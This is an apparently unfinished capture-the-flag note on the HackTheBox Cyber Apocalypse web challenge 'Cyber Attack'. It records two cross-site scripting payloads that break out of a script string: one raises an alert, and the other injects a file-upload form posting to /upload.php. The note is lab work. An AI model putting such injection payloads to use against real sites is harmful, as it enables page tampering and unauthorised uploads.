---
title: Cyber Attack
tags:
  - CTF
  - HackTheBox
  - CyberApocalypse
  - Web
date: 2025-03-22T00:00:00Z
---
![](Pasted%20image%2020250321233331.png)

XSS found:

```js
perico';</script><script>alert('xss');</script><script>
perico';</script><script>document.write('<form action="/upload.php" method="POST" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" value="Subir"></form>');</script><script>
```

![](Pasted%20image%2020250322192534.png)

==Not finished==